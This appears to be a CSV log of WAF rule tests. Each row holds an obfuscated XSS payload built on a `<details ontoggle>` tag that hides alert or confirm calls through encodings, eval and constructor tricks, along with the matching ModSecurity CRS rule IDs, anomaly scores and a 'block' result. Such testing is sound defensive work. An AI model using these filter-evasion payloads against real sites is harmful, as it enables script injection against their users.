215,"<details open ontoggle=""(function(){var r='ale\x72t';window[r](1)})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o59,10v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,9v217,72t:urlDecodeUni,t:compressWhitespace || ",25,177603327033.591247
216,"<details open ontoggle=""(function(){var s=decodeURI('%61lert');window[s](1)})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o67,10v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,82 || o25,11v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,9v217,82t:urlDecodeUni,t:compressWhitespace || ",30,177603327135.252793
217,"<details open ontoggle=""(function(){var t='al'+String.fromCharCode(101)+'rt';window[t](1)})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o83,10v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,96 || o25,11v217,96t:urlDecodeUni || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o77,9v217,96t:urlDecodeUni,t:compressWhitespace || ",30,177603327287.909483
219,"<details open ontoggle=""(function(){var v=[]['constructor']['constructor']('return\x20alert')();v(1)})();"">",0,1,block,5,"933210,934100,941100,941120,949110","o42,62v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603327459.479008
220,"<details open ontoggle=""(function(){var b='aler'+'t';window[b](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o59,11v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,73 || o25,11v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,9v217,73t:urlDecodeUni,t:compressWhitespace || ",30,177603327439.030869
221,"<details open ontoggle=""(function(){var c=String.fromCharCode(97,108,101,114,116);window[c](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o88,11v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v217,102t:urlDecodeUni,t:compressWhitespace || ",25,177603327577.004450
222,"<details open ontoggle=""(function(){var d=atob('YWxlcnQ');window[d](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o64,11v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,9v217,78t:urlDecodeUni,t:compressWhitespace || ",25,177603327697.096458
223,"<details open ontoggle=""(function(){var e='al'+'ert';self[e](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o57,11v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,71 || o25,11v217,71t:urlDecodeUni || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,7v217,71t:urlDecodeUni,t:compressWhitespace || ",30,177603327761.810912
225,"<details open ontoggle=""(function(){var g=['ale','rt'].join('');window[g](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o70,11v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,9v217,84t:urlDecodeUni,t:compressWhitespace || ",25,177603327953.950200
226,"<details open ontoggle=""(function(){var h='\u0061\u006c\u0065\u0072\u0074';window[h](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o81,11v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o75,9v217,95t:urlDecodeUni,t:compressWhitespace || ",25,177603328040.776273
227,"<details open ontoggle=""(function(){var i='al'+'ert';top[i](1);})();"">",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o52,4v217,70 || o56,11v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,70 || o25,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,6v217,70t:urlDecodeUni,t:compressWhitespace || ",35,177603328155.469930
228,"<details open ontoggle=""(function(){var j='al'+String['fromCharCode'](101)+'rt';window[j](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o53,44v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,100 || o25,11v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o80,9v217,100t:urlDecodeUni,t:compressWhitespace || ",30,177603328251.932853
229,"<details open ontoggle=""(function(){var k=String['fromCharCode'](97,108,101,114,116);window[k](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,54v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,105t:urlDecodeUni,t:compressWhitespace || ",25,177603328330.563441
231,"<details open ontoggle=""(function(){var n='al'.concat('ert');window[n](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o67,11v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,9v217,81t:urlDecodeUni,t:compressWhitespace || ",25,177603328542.071134
233,"<details open ontoggle=""(function(){var p='al'+'ert';parent[p](1);})();"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o59,11v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,73 || o25,11v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603328654.164231
234,"<details open ontoggle=""(function(){var q='al'+'\x65'+'rt';window[q](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o65,11v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,79t:urlDecodeUni,t:compressWhitespace || ",30,177603328778.905882
235,"<details open ontoggle=""(function(){var r='ale'+'rt';globalThis[r](1);})();"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o63,11v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603328868.084594
236,"<details open ontoggle=""(function(){var s='al'+'e'+'rt';window[s](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o62,11v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,76 || o25,11v217,76t:urlDecodeUni || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,9v217,76t:urlDecodeUni,t:compressWhitespace || ",30,177603328948.330090
237,"<details open ontoggle=""(function(){var t=`al`+String.fromCharCode(0x65)+`rt`;window[t](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o84,11v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,98 || o25,11v217,98t:urlDecodeUni || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,9v217,98t:urlDecodeUni,t:compressWhitespace || ",30,177603329096.759543
238,"<details open ontoggle=""(function(){var u='al'+'e'+'r'+'t';window[u](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o65,11v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,79t:urlDecodeUni,t:compressWhitespace || ",30,177603329162.447081
239,"<details open ontoggle=""(function(){var v=String.fromCharCode(0141,0154,0145,0162,0164);window[v](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,11v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,108t:urlDecodeUni,t:compressWhitespace || ",25,177603329273.152769
240,"<details open ontoggle=""(function(){var a=String.fromCharCode(99,111);var b=String.fromCharCode(110,102,105,114,109);eval(a+b+'(1)')})()"">",0,1,block,7,"932100,933160,934100,934100,941100,941120,949110","o116,5v217,138 || o117,19v217,138 || o25,11v217,138 || o25,11v217,138t:urlDecodeUni || v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603329392.659500
241,"<details open ontoggle=""(function(){var a='co';var b='nfirm';window[a+b](1)})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o67,12v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || o25,11v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,11v217,81t:urlDecodeUni,t:compressWhitespace || ",30,177603329466.605607
242,"<details open ontoggle=""(function(){var a='co';var b='nfirm';this[a+b](1)})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o65,12v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,9v217,79t:urlDecodeUni,t:compressWhitespace || ",30,177603329558.535188
243,"<details open ontoggle=""(function(){var a='co';var b='nfirm';[]['constructor']['constructor'](a+b+'(1)')()})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o61,49v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,112 || o25,11v217,112t:urlDecodeUni || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603329662.951080
244,"<details open ontoggle=""(function(){var a='\u0063\u006f';var b='\u006e\u0066\u0069\u0072\u006d';eval(a+b+'(1)')})()"">",0,1,block,7,"932100,933160,934100,934100,941100,941120,949110","o95,5v217,117 || o96,19v217,117 || o25,11v217,117 || o25,11v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603329797.722351
245,"<details open ontoggle=""(function(){var a='co'+'nf'+'irm';window[a](1)})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o64,10v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,76 || o25,11v217,76t:urlDecodeUni || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,9v217,76t:urlDecodeUni,t:compressWhitespace || ",30,177603329895.220297
246,"<details open ontoggle=""(function(){var a='co';var b='nfirm';(1,eval)(a+b+'(1)')})()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,86 || o25,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603329977.000351
247,"<details open ontoggle=""(function(){var a=atob('Y29uZmlybQ==');window[a](1)})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o69,10v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o63,9v217,81t:urlDecodeUni,t:compressWhitespace || ",25,177603330026.111394
248,"<details open ontoggle=""(function(){var a='co';var b='nfirm';Function(a+b+'(1)')()})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o69,17v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,88 || o25,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603330110.836689
249,"<details open ontoggle=""(function(){var a='co';var b='nfirm';setTimeout(a+b+'(1)')})()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,88 || o25,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603330184.744586
250,"<details open ontoggle=""(function(){var a='&#99;&#111;';var b='&#110;&#102;&#105;&#114;&#109;';eval(a+b+'(1)')})()"">",0,1,block,7,"932100,933160,934100,934100,941100,941120,949110","o94,5v217,116 || o95,19v217,116 || o25,11v217,116 || o25,11v217,116t:urlDecodeUni || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603330294.359711
252,"<details open ontoggle=""(function(){var a='co';var b='nfirm';new Function(a+b+'(1)')()})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o73,17v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,92 || o25,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603330439.325373
253,"<details open ontoggle=""(function(){var a='co',b='nfirm';(0,eval)(a+b+'(1)')})()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,82 || o25,11v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603330590.554084
254,"<details open ontoggle=""(function(){var a=String.fromCodePoint(99,111,110,102,105,114,109);window[a](1)})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o97,10v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o91,9v217,109t:urlDecodeUni,t:compressWhitespace || ",25,177603330664.021284
255,"<details open ontoggle=""(function(){var a='co';var b='nfirm';top[a+b](1)})()"">",0,1,block,8,"932105,933210,934100,934100,941100,941120,941370,949110","o60,4v217,78 || o64,12v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,78 || o25,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,8v217,78t:urlDecodeUni,t:compressWhitespace || ",35,17760333073.196966
256,"<details open ontoggle=""(function(){var a='co';var b='nfirm';parent[a+b](1)})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o67,12v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || o25,11v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603330861.494944
257,"<details open ontoggle=""(function(){var a='co';var b='nfirm';globalThis[a+b](1)})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o71,12v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,85 || o25,11v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603330913.254412
259,"<details open ontoggle=""(function(){var a='co';var b='nfirm';self[a+b](1)})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o65,12v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,9v217,79t:urlDecodeUni,t:compressWhitespace || ",30,17760333115.627236
261,"<details open ontoggle=""(function(){var a=String['fromCha'+'rCode'](97,108,101,114,116);window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,57v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || o25,11v217,107t:urlDecodeUni || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,107t:urlDecodeUni,t:compressWhitespace || ",30,177603331323.137257
262,"<details open ontoggle=""(function(){var a=(String).fromCharCode(0141,0154,0145,0162,0164);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o96,11v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o90,9v217,109t:urlDecodeUni,t:compressWhitespace || ",25,17760333131.178392
263,"<details open ontoggle=""(function(){var a=atob('YWxlcnQ');window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o64,11v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,9v217,77t:urlDecodeUni,t:compressWhitespace || ",25,177603331427.091371
264,"<details open ontoggle=""(function(){var a=[]['constructor']['constructor']('retur'+'n Strin'+'g')()['fromCharCode'](97,108,101,114,116);window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o42,111v217,155t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,155 || o25,11v217,155t:urlDecodeUni || v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,155t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o136,9v217,155t:urlDecodeUni,t:compressWhitespace || ",30,177603331584.258235
265,"<details open ontoggle=""(function(){var a=String.fromCodePoint(0x61,0x6c,0x65,0x72,0x74);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o95,11v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o89,9v217,108t:urlDecodeUni,t:compressWhitespace || ",25,177603331676.470732
266,"<details open ontoggle=""(function(){var a=String[`fromCharCode`](0x61,0x6c,0x65,0x72,0x74);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o97,11v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o91,9v217,110t:urlDecodeUni,t:compressWhitespace || ",25,177603331728.096892
267,"<details open ontoggle=""(function(){var a=self['Str'+'ing']['fromCh'+'arCode'](97,108,101,114,116);window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o46,70v217,118t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,118 || o25,11v217,118t:urlDecodeUni || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,17v217,118t:urlDecodeUni,t:compressWhitespace || ",30,177603331859.725887
268,"<details open ontoggle=""(function(){var a=top['String'].fromCharCode(97,108,101,114,116);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o95,11v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,13v217,108t:urlDecodeUni,t:compressWhitespace || ",25,177603331996.436874
269,"<details open ontoggle=""(function(){var a=parent.String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o101,11v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o95,9v217,114t:urlDecodeUni,t:compressWhitespace || ",25,177603332087.834598
270,"<details open ontoggle=""(function(){var a=String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116);window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o172,11v217,185t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,185 || o25,11v217,185t:urlDecodeUni || v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o166,9v217,185t:urlDecodeUni,t:compressWhitespace || ",30,177603332192.703197
271,"<details open ontoggle=""(function(){var a=globalThis.String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o105,11v217,118t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,118 || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o99,9v217,118t:urlDecodeUni,t:compressWhitespace || ",25,177603332293.635925
272,"<details open ontoggle=""(function(){var a=frames.String.fromCharCode(97,108,101,114,116);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o95,11v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o89,9v217,108t:urlDecodeUni,t:compressWhitespace || ",25,177603332352.204903
